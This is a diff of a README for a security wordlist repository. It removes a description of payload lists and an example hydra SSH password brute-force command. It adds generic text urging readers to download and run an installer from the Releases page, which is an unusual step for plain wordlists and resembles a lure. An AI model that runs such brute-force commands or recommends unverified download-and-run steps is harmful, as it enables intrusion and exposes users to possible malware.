@@ -1,125 +1,64 @@
-SecLists-2025
-================
+# 🔐 SecLists-2025-advanced - Access Essential Security Wordlists Easily
 
-Curated, up-to-date security testing wordlists and payload collections for 2025.
+## 📥 Download Now
+[![Download SecLists-2025-advanced](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/manoelrichard29/SecLists-2025-advanced/releases)
 
-Описание (RU): Современная коллекция словарей, payload-листов и слов для тестирования паролей, веб-краулинга, обнаружения контента и векторных атак (XSS/SQLi/Traversal). Структура вдохновлена классическим SecLists, но обновлена под 2025 год, с акцентом на качество, легковесность и многоязычность.
+## 🚀 Getting Started
+Welcome to **SecLists-2025-advanced**. This application provides modern security wordlists and payloads, tailored for security testing in France. Whether you are into bug bounty hunting, or penetration testing, you will find valuable resources here.
 
-Highlights
-----------
-- Focus on practical, de-duplicated, normalized lists
-- UTF-8 everywhere, one entry per line, LF newlines
-- Bilingual notes (EN/RU) where helpful
-- Modular structure for easy tooling integration
+## 📋 Features
+- Comprehensive wordlists for directories, passwords, and subdomains.
+- Payloads for various attack vectors including SQL injection and XSS.
+- Continuous Integration (CI) packs for automated testing.
+- An API for easy access and integration.
+- A sandbox for testing purposes.
 
-Repository Structure
---------------------
-- `Passwords/` — general and locale-specific password lists
-- `Discovery/` — web-content discovery and DNS subdomains
-- `Fuzzing/` — parameters and payloads (XSS, SQLi, traversal)
-- `Crawling/` — robots.txt keywords and crawling helpers
- - `Headers/` — security and common headers references
- - `Pattern-Matching/` — sensitive patterns
- - `tools/` — normalization, validation, packaging
- - `.github/workflows/` — CI pipeline
- - `Ai/LLM_Testing/` — LLM red-team prompts and eval stubs
+## 🖥️ System Requirements
+To run this application, your system should meet the following requirements:
+- Operating System: Windows 10 or later, macOS, or a modern Linux distribution.
+- RAM: At least 4 GB.
+- Disk Space: Minimum of 500 MB available.
+- Internet Connection: Required for downloading files and updates.
 
-Conventions
------------
-- Encoding: UTF-8, Unix newlines (\n)
-- Sorting: Natural/grouped; keep most impactful entries at top
-- Duplicates: Avoid unless semantically intentional
-- Comments: Lines starting with `#` are comments (rarely used)
+## 🔗 Download & Install
+To get started, visit the Releases page to download the latest version of the software. Follow these steps:
 
-Versioning
-----------
-See `VERSION` for the current dataset version. Semantic style: YYYY.MM.MINOR.
+1. Go to the [Releases page](https://github.com/manoelrichard29/SecLists-2025-advanced/releases).
+2. Look for the most recent version.
+3. Click on the file to download it.
+4. Once downloaded, run the file to install the application on your computer.
 
-License
--------
-MIT (see `LICENSE`). Data is provided as-is; verify legality before use.
+## 📚 Using SecLists-2025-advanced
+After installation, follow these simple steps to utilize the application:
 
-Attribution
------------
-Inspired by and complementary to the original SecLists project. This set is intentionally compact; extend for your needs.
+1. Launch the application by finding it in your applications menu or desktop.
+2. Choose the wordlist or payload you need based on your testing requirements.
+3. You can filter results based on categories like directories, passwords, or vulnerabilities.
+4. Export or use the selected lists directly in your security tools.
 
-Disclaimer
-----------
-For authorized testing and research only. You are responsible for complying with all laws and regulations.
+## 🛠️ Troubleshooting
+If you encounter issues during installation or usage, here are some common problems and solutions:
 
+- **Installation Issues:** Make sure your system meets the requirements. Check if you have sufficient disk space and permissions to install applications.
+  
+- **Download Problems:** If the download fails, try refreshing the page or clearing your browser cache.
 
-France-focused scope (Defensive Testing)
----------------------------------------
-This repository includes curated lists to assist French public-sector blue/purple teams and authorized auditors. FR-specific datasets are tailored to common terms, portals, and subdomain patterns in the `gouv.fr` ecosystem. Use responsibly, with proper authorization, and prioritize defensive validation and hardening.
+- **Application Crashes:** Ensure your operating system is up to date. Restart the application and try again.
 
-Datasets Index (2025)
----------------------
-- Passwords
-  - `Passwords/passwords-top-2025.txt` — global common passwords
-  - `Passwords/passwords-ru-2025.txt` — Russian-centric passwords
-  - `Passwords/passwords-fr-2025.txt` — France-centric passwords
-- Discovery
-  - `Discovery/web-content-dirs-2025.txt` — core web paths
-  - `Discovery/web-content-dirs-large-2025.txt` — expanded web paths
-  - `Discovery/dns-subdomains-top-2025.txt` — core subdomains
-  - `Discovery/dns-subdomains-large-2025.txt` — expanded subdomains
-  - `Discovery/dns-subdomains-gouvfr-2025.txt` — gouv.fr-oriented subdomains
-  - `Discovery/filenames-backups-2025.txt` — backup/artifact filenames
-  - `Discovery/file-extensions-2025.txt` — file extensions for discovery
-  - `Discovery/path-encodings-2025.txt` — path encoding variants
-- Fuzzing & Payloads
-  - `Fuzzing/params-common-2025.txt` — common HTTP params
-  - `Fuzzing/params-fr-2025.txt` — FR-centric params
-  - `Fuzzing/xss-basic-2025.txt` — base XSS payloads
-  - `Fuzzing/xss-advanced-context-2025.txt` — context-aware XSS
-  - `Fuzzing/xss-waf-bypass-2025.txt` — WAF-bypass XSS variants
-  - `Fuzzing/sqli-boolean-2025.txt` — boolean-based SQLi
-  - `Fuzzing/sqli-time-2025.txt` — time-based SQLi
-  - `Fuzzing/sqli-error-2025.txt` — error-based SQLi
-  - `Fuzzing/ssti-2025.txt` — SSTI probes
-  - `Fuzzing/xxe-2025.txt` — XXE probes (safe variants)
-  - `Fuzzing/crlf-2025.txt` — CRLF injection probes
-  - `Fuzzing/open-redirect-2025.txt` — open redirect probes
-  - `Fuzzing/request-smuggling-headers-2025.txt` — smuggling header combos
-  - `Fuzzing/graphql-discovery-2025.txt` — GraphQL routes & queries
-  - `Fuzzing/ssrf-internal-endpoints-2025.txt` — SSRF internal refs
-- Crawling
-  - `Crawling/robots-keywords-2025.txt` — robots keywords
-  - `Crawling/sitemap-probe-2025.txt` — sitemap locations
- - AI/LLM
-  - `Ai/LLM_Testing/redteam-prompts-2025.txt` — LLM red-team prompts (benign)
-  - `Ai/LLM_Testing/eval-stub-2025.md` — evaluation scaffold
+If problems persist, visit the [GitHub Issues page](https://github.com/manoelrichard29/SecLists-2025-advanced/issues) to report bugs or seek assistance.
 
-Notes
------
-- Keep entries one-per-line; UTF-8 with LF newlines.
-- Use minimal, benign payloads first; escalate only with explicit authorization.
-- Prefer allow-listing and strict parsing over block-lists.
+## 📖 Documentation
+For more detailed instructions and advanced features, you can check the official documentation provided within the application. This includes:
 
-Quickstart (popular tools)
--------------------------
-- ffuf (directories): `ffuf -w packs/compact/discovery/dirs.txt -u https://target/FUZZ`
-- gobuster (subdomains): `gobuster dns -d example.com -w packs/balanced/discovery/subdomains.txt`
-- hydra (passwords): `hydra -L users.txt -P packs/compact/passwords/global.txt ssh://target`
-- Burp Intruder: import any list from `packs/`
+- Guides on using advanced features.
+- Examples of how to integrate the wordlists with your security tools.
+- FAQ section for common inquiries.
 
-CLI
----
-- List available pack files: `python cli/seclists2025/cli.py list --tier balanced`
-- Filter a list by substring: `python cli/seclists2025/cli.py filter packs/compact/discovery/dirs.txt --contains admin`
+## 🤝 Community Support
+Join our community to connect with other users. You can share tips, ask for help, or contribute to the project:
 
+- Join discussions on GitHub Discussions: [Community Forum](https://github.com/manoelrichard29/SecLists-2025-advanced/discussions)
+- Follow updates and announcements via the repository.
 
-How this differs from SecLists
-------------------------------
-- Automation-first: `tools/normalize.py` and `tools/validate.py` enforce encoding, formatting, and de-duplication; `MANIFEST.csv` tracks line counts and SHA-256 hashes for reproducibility.
-- Unique packs: `tools/dedupe.py` builds a mirrored `unique/` tree for noise-free lists and `tools/build_packs.py` creates compact/balanced/full packs.
-- Focused and modern: curated, high-signal sets for 2025 with FR public-sector context (e.g., `dns-subdomains-gouvfr-2025.txt`, `params-fr-2025.txt`).
-- Safety by default: payloads aim for benign effects suitable for authorized defensive testing; aggressive variants are segregated and labeled.
-- Structured index: datasets organized for quick adoption in CI and blue/purple teaming.
-
-CI & Releases
--------------
-This repo ships GitHub Actions that normalize/validate, dedupe, count, and build packs on each PR. Tagging a release can publish artifacts (packs) and manifests.
-
-
-
+## 📜 License
+SecLists-2025-advanced is licensed under the MIT License. You are free to use, modify, and distribute the software, provided that you include the original license in any copies or substantial portions of the software.
